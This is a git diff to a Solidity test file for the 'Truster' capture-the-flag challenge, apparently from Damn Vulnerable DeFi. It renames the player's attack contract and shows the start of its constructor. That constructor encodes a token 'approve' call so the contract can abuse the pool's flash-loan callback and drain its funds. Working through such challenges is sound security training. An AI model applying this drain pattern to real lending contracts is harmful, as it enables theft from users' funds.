@@ -51,7 +51,7 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        AttackTruster attackTruster = new AttackTruster(address(pool), address(token), recovery, TOKENS_IN_POOL);
+        Attack attackTruster = new Attack(address(pool), address(token), recovery, TOKENS_IN_POOL);
     }
 
     /**
@@ -67,7 +67,7 @@ contract TrusterChallenge is Test {
     }
 }
 
-contract AttackTruster {
+contract Attack {
     constructor (address _pool, address _token, address _recovery, uint256 tokens) payable {
         TrusterLenderPool pool = TrusterLenderPool(_pool);
         bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), tokens);
